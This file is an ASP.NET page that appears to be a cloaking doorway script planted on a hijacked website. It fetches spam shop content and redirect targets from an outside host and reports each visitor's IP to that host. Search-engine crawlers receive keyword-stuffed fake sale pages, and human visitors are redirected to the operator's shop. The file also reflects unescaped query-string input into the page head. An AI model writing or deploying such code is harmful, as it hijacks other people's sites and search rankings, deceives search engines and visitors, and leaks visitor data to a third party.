<%@ Page Language="C#" %>

<script runat="server">

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            httpxy = HttpContext.Current.Request.IsSecureConnection ? "https://" : "http://";


            webclient = new System.Net.WebClient();
            webclient.Encoding = System.Text.Encoding.UTF8;
            jd = "";
            sz = "";
            if (Request.QueryString["g"] != null && Request.QueryString["g"] != "")
            {
                jd = webclient.DownloadString("http://dy2.jgdy99.com/1.aspx?sz=" + Request.QueryString["g"]);
                sz = Request.QueryString["g"];
            }
            else
            {
                jd = webclient.DownloadString("http://dy2.jgdy99.com/1.aspx?xy=" + httpxy);
                sz = webclient.DownloadString("http://dy2.jgdy99.com/1.aspx?jd=" + jd);
            }


            string URL = jd + "jg888.aspx";

            if (Request.QueryString["s"] != null)
            {

                URL = jd + "s888.aspx?number=" + Request.QueryString["number"] + "&pnum=" + Request.QueryString["pnum"] + "&cid=" + Request.QueryString["cid"];
                content = webclient.DownloadString(URL);
                content = content.Replace("yymm", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
                content = content.Replace("ggggg", sz);
                Response.Write(content);
                Response.End();
            }
            else
            {

                if (Request.QueryString["iid"] != null)
                {


                    URL += "?iid=" + Request.QueryString["iid"] + "&cid=" + Request.QueryString["cid"];
                    kname = HttpUtility.UrlDecode(Request.QueryString["shop"]);
                    tz();
                    content = webclient.DownloadString(URL);
                }
                else if (Request.QueryString["shop"] != null)
                {

                    int wid = new Random().Next(1, 237);
                    URL += "?shop=" + HttpUtility.UrlEncode(Request.QueryString["shop"]) + "&cid=" + Request.QueryString["cid"];
                    kname = HttpUtility.UrlDecode(Request.QueryString["shop"]);
                    tz();
                    content = webclient.DownloadString(URL);
                }
                else
                {
                    tz();
                    if (Request.QueryString["pnum"] != null)
                    {
                        URL += "?cid=" + Request.QueryString["cid"] + "&pnum=" + Request.QueryString["pnum"];
                    }
                    content = webclient.DownloadString(URL);
                }

            }
            content = content.Replace("ggggg", sz);
            content = content.Replace("IIIII", httpxy + HttpContext.Current.Request.Url.Host);
            content = content.Replace("UUUUU", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
            content = content.Replace("BBBBB", HttpContext.Current.Request.Url.Host);
            content = content.Replace("NNNNN", kname + Request.QueryString["iid"]);
            content = content.Replace("SSSSS", kname + Request.QueryString["iid"] + Request.QueryString["searchtxt"] + Request.QueryString["pnum"]);
            content = content.Replace("HHHHH", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
            content = content.Replace("DDDDD", Request.QueryString["shop"] + " Discover and shop affordable women's clothing, shoes and accessories for a variety of daily needs. Shop the latest women's clothing collections at affordable prices. Free shipping!");
        }
    }
    public void tz()
    {

        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_HOST"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDED_FOR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_CLIENT_IP"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDED"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_FORWARDED_FOR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_FORWARDED"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string ipurl = "http://dy2.jgdy99.com/getdomain.aspx?rnd=1&ip=" + ip;
        webclient = new System.Net.WebClient();
        webclient.Encoding = System.Text.Encoding.UTF8;
        string domain = webclient.DownloadString(ipurl).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1 && domain.IndexOf("yandex") == -1)
        {
            string tzurl = jd + "a.aspx";
            if (Request.QueryString["iid"] != null)
            {
                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(kname));
                Response.End();
            }
            if (Request.QueryString["shop"] != null)
            {
                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(kname));
                Response.End();
            }
            if (Request.QueryString["pnum"] != null)
            {

                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "");
                Response.End();
            }
        }
    }
    public string xi = "1";
    public string xc = "50";

    public System.Net.WebClient webclient = null;
    public string content = "";
    public string content1 = "";
    public string hyzhdy = "";
    public string Greeting = "";
    public string zhang = "";
    public string hhhvx = "";
    public string URL1 = "";
    public System.Random a = null;
    public string descriptions = "";
    public string kname = "";
    public string jd = "";
    public string sz = "";
    public string httpxy = "";
</script>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <script>
        document.cookie = "u=" + window.location.href;
    </script>
    <title>Cheap ><%=kname%><%=Request.QueryString["searchtxt"]%> big sale - OFF <%=new Random().Next(60, 80)%>% <%=Request.QueryString["pnum"]%> </title>
    <meta name="keywords" content="<%=kname%><%=Request.QueryString["searchtxt"]%>" />
    <meta name="description" content="Shopping ><%=kname%> OFF-<%=new Random().Next(60, 80)%>% Save on branded products with the best sales and offers on this page! Shop furniture, bedding, jewelry, clothing, shoes, electronics and more with free worldwide shipping!<%=Request.QueryString["searchtxt"]%>" />
    <meta name="robots" content="index,follow,all" />
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="sitemap" type="application/xml" title="Sitemap" href="<%=httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path %>?s=s" />
    <style>
        @media (max-width: 768px) {
            body {
                width: 100%;
                height: 100%;
            }

            body {
                font-family: Open Sans,'Helvetica Neue',Arial,sans-serif;
                font-size: 15px;
                color: #777;
                line-height: 1.7;
            }

            img {
                width: 80%;
            }

            iframe {
                max-width: 100% !important;
                height: auto;
                float: left;
            }

            div {
                width: 100% !important;
                float: left;
            }

                div span {
                    width: 100%;
                    float: left;
                }

            a {
                color: #f05f40;
                -webkit-transition: all .35s;
                -moz-transition: all .35s;
                transition: all .35s;
            }

                a:hover, a:focus {
                    color: #eb3812;
                }
        }
    </style>
</head>

<body>

    <%=content.Replace("XXXXX",HttpContext.Current.Request.Url.Host) %>
    <%=content1 %>
</body>


</html>
